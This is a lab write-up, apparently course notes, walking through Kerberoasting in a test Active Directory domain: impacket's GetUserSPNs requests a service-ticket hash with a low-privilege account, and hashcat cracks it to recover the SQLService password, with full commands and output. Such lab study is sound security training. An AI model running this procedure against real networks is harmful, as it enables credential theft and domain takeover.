# Kerberoasting Walkthrough

I have struggled quite a bit to get this to work.

```
┌──(kali㉿kali)-[~]
└─$ sudo impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation
--------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-07-25 17:32:29.702912  <never>



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Following the recommendations I have found both on the internet and in the
`Discord` channel for `Practical Ethical Hacking` I have found recommendations
to use `ntpdate` or `rdate`. Neither of the two worked in my case.

```
┌──(kali㉿kali)-[~]
└─$ sudo ntpdate 10.0.2.15                                                        
2025-08-17 23:08:55.880432 (+0200) +32398.072782 +/- 0.000355 10.0.2.15 s1 no-leap
CLOCK: time stepped by 32398.072782
```

This led to the same result as shown at the top of this writeup. I have then
tried the `rdate` command:

```
┌──(kali㉿kali)-[~]
└─$ sudo rdate -n 10.0.2.15                                                           
Sun Aug 17 23:14:49 CEST 2025
```

Still the same error message as in the beginning. I have also tried a package
called `faketime`. This did not work either.

Finally, I have simply tried to change the time settings on both machines
manually, at first keeping the `Berlin` time zone on my Kali machine and
setting the time on the Windows Server from hand. (This did not have immediately
noticeable repercussions on the communication with the Windows 10 user machines
`THEPUNISHER`.) Anyway, after this change, `GetUserSPNs.py` worked immediately.
I changed my mind later and set the server clock back to its original `US
Pacific` time zone since I will have to change the time on the attack box in a
pentesting engagement. I could still steal the admin password hash of the
domain controller. Question is: how do I find out the time that is set on the
domain controller as long as I do not have access to it?

Usage of `GetUserSPNs.py` is as follows (from `--help` switch):

```
usage: GetUserSPNs.py [...][-request][-hashes LMHASH:NTHASH][-dc-ip ip address][-dc-host hostname] target

positional arguments:
  target                domain[/username[:password]]

options:
  (...)
  -request              Requests TGS for users and output them in JtR/hashcat format (default False)
  -save                 Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter. Ignoredif
                        -target-domain is specified.
  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
```

Using the credentials `fcastle:Password1` of the low priviledge (!) user
`fcastle` and the IP of the domain controller `10.0.2.15` we can get the sought
hash, but in this case of the admin `SQLService`. Any set of valid account
credentials will work. TCM has used `sudo`, but this is apparently not
necessary.

```
┌──(kali㉿kali)-[~]
└─$ GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request     
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation 
--------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2025-07-25 17:32:29.702912  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$0b58c47519aac17ce60e6d5212b684ed$6f3dc4c58429d09dc14583772a4df19a55cff87f83b2256b7bb81c4c2ddb829789a02144e813012edbea03857626c1ae6e69488478c2d8c987bfb438df555cbd6ce5eef789db89fac12963b61c1a69b5eb87b32774616e6aa931730596eacc0fa33e89098949009fc7218e6504f547c75037e432233496b7bb5eab8db82f5bee1aed320348b46e034e6c0c7abf5b821ee817fbb8eb9c1e818145091e3d8c36dbdd639e14e1c3b53cee17415a313fe6c184a84ba47368af13c7ace99ab03770d05e18c69b3371f66ff08ae5e81fef01ca10073f5529b3caf01717aee6e8fe60dccede20efeb33d5081376834bfd9141e5b9d1fec968a06496a5567f1d4ead828f7a01d6373d05b05e5d33a77b1f188fc12ea0937810d64bda250473801aaa4a9fe2600589aa27eb160653608b8cedc7332e54ba06741c789c0be8c79dff987f7d167519f3f65f1bb1647d2bfbbe849976d8c07a8be720f4537bbec970f5488df1e90dc255434d234637492efc201ed9d26a4e1a10de389a905f15818f7f65d28d566ae0ca13d820556bd95ed03b8ad42b01146a7bcc316d155281e762e5d0d52cd505dfcce33e5002fefcd134add236eeb847760565c40c9ce7e9a9c59c1eb68a42996c8bf3c218da580de6f5c19a376a07948c541472f3ff7d4017db3c0a6d1a00df221311526b47bd53815a9042cd822553cffa51d33de9e66c7a735592811083c6432ba0b2ce1054aaaa44943e397fc2b26322e8a8b234cd6935d9b3343f76522e7db3db6f27af556b99892fedd07444ff75fc7501337e7a8a8e2273b31936a1e3cd0ad10322100d57da599ba41f10fa87009bd90ddd72ef5a09fd06ab6a383810c1f4a49f895e9744488b72b7ab4a6a5971cadff68784e0c11b63e4d0d0f3ff70594f0386f1eaa16a9650286d90dd216abd5366551546cc5985fcac67004e292875790661f3dcc162fbcf4c64b37d6d300f08719f8ff1d40f1842b4054a53c2b1c996ddecaa450d3d795a60f830655382a98d9f201b65bc398c4391f0c05c42313486ee617a2684a505e8cd2efc6244c5e8284f2eaf36d51c24696cb4e9f0c9d0923eda8b15853c5193e948e13fcb608b9c741c62b589e7bb63dfce1d0050d106264206ef09e201143ad9011bba44358ecafba29bd803103664e182fdeb51229862d6820c01587fd92e7bad5fd8b2748a73409837859d07e9efd3c419919a78f645e654c8101e019618f13ad8123c4987baa4ffd8cbe268fa96d954021e3db0660646b73a98cac382e8c1dd5c11e962851a5e0232bced36cafbc887dc1fe0f91c82b370cb93abe573b69a595c34e473f3673abe81f0d29c48c5d53bd8d6112e600a0da431ac00bb054557ac92b01e50fa245dfcb8dbdb0900d78fafb05e59cf64e17240ac265a44548584859381f56a572cdb34f669a3bd0c8d35
```

When I run this command again, the hash vaule changes every time. If an account
has never been used (`LastLogon    <never>`) it may be a honeypot account --
careful! We should know from the previous enumeration section how to find out
what the high value accounts are, even though it is not explicitly stated that
`SQLService` is a domain administrator.

We can now use `hashcat` to crack the password using mode 13100.

```
┌──(kali㉿kali)-[~/LLMNR_Poisoning]
└─$ hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 PRO 4750U with Radeon Graphics, 1438/2941 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$9bd3573f78277fa2138dc0b28182dea3$7557b6a27ce55b4601b78a4c4530154244db3052b6b36c53cb8e977bec96f205fc1292b56f6cf98ef56d8f0407015cdb3ebd5adb0445f74b41e2e57809dcb882c871a5f10147fcdf507a46fceb874eaff565239b064d6b0ff621080716e9d902c351054dfcceae310d7eaf534946de0ad6cf0ae949ee2d742956a6e94a6ad944000d9eb0cf808ab6c46efc57ea148362dd2b8728af06385c8725f6532aa7dd879c2b8db0195226186d480b67faa9af629212aa1b45b95fc098c88a9f7b598728bce02bd2d3a1be7e03b99abc0876151e41d2ed2f30a47f113d5eebf7ffbb18d73323a3181869fae44a146ff5c8064450462003b4268267d1c4eaa494aef3205d46de20fe923135d651f15d87e4d10c6b77a4dfb95e9a6a66872a9c812edc264a6d12c7ad4364f93da305864c0f95a928f880e15292f1ebd14b1bca007b6bacd101c414a98543c3c2ee653274ac3eaccff90e6b75b45adce5ef2301a8aef27745a31f97bf0e72a2869704ac2b2e8720343f0425d251f1ff030335b67f1f938d847a7953cf53e8bb91c9277dc36501f3b5147402a2298e162c993f4b5cf97ed36116b3840417a210c89b9b1cac934c4dd095fb2723f6a37fffb391fecd2a3b54c8f5ddf18abb3b951c73846251165d858d905ac5b2b56eeab9fdde7d986a652f71133e590c565b2a9bf2e54b7bae6f029f4c3ab97af88156578f1643379f7c6539ceae3b3acac16b4c3bf596841cd3a42a37fd5a4a43f7fc264fa6051ec1887dca653a6959db7dd6757f66b56d30b702b3899844b48116db826eea4d68ab97b96bf1aae463c00b001049afd43668a7d974f5810ee748bde59d8c2f1230eafd559502ab66b6eff2f344d76ae21403c307c071290277830fd8e165894abd2a68c66f4e359ab71dd3695628f8641274ce627dc2b1689c0e3ae9b2818fc3655922b542c65318e1f49ff2f19a732e10a2d1bd1a5c9bcfa79e92687e9d282a93a7bb38286fea44ccbff83e0f13be46ce32608f815a526a5d0631fe66e40a7eeace1599c93fd9183c3d71088e3a4e25b579ec12e67c5a1d381ada515a0c90be9cc0fbac503bd1411cc8894daec6d636b6c14ab73ad6c02ec76753ab7c355b8c9ff3ad96431ada1000ee31fb2149963588b5f6454fd040c16de5866730ce302b4986cee5c0a99f1f4620d6d996d924374721c9b1dbe9e64ffb181bfcc945fd795e401ed440ab31dc64f020ffa7f8b343f1c5f02955b58796b1b4f0c7b56eed36d303333d8d14f3f89226e31937de33ea1ee885e2f4046e1c76a60cb2fd5ba12c57e958b1ae1ccdcf4f37613134b956183cb470aa584f0a3b569e435eec895014f108e3bab46ba50d508b57dc73da0b3d1d7e7cc30972433feebf7453ae11a7c409f9a104ea0135652869fac00f6d42cf4b14c319441e1210ee414227c198158583:MYpassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/S...158583
Time.Started.....: Sun Aug 17 10:26:34 2025 (9 secs)
Time.Estimated...: Sun Aug 17 10:26:43 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1201.2 kH/s (0.64ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10846208/14344385 (75.61%)
Rejected.........: 0/10846208 (0.00%)
Restore.Point....: 10845184/14344385 (75.61%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: MZDRICA -> MYSELFonly4EVER
Hardware.Mon.#1..: Util: 64%

Started: Sun Aug 17 10:26:14 2025
Stopped: Sun Aug 17 10:26:44 2025
```

The cracked password can be found at the end of the hash value:
**MYpassword123#**. Even though the password meets all formal requirements on a
strong password, it was actually easy to crack within a few seconds. Now we
have moved on vertically from knowing low-privilege user credentials (`fcastle`)
to knowing the credentials of a domain administrator. We can now compromise the
entire domain!

Kerberoasting is one of the first attacks TCM runs when he compromises an
account.



<!--
span style="color:green;font-weight:700;font-size:20px">
markdown color font styles
</span
-->
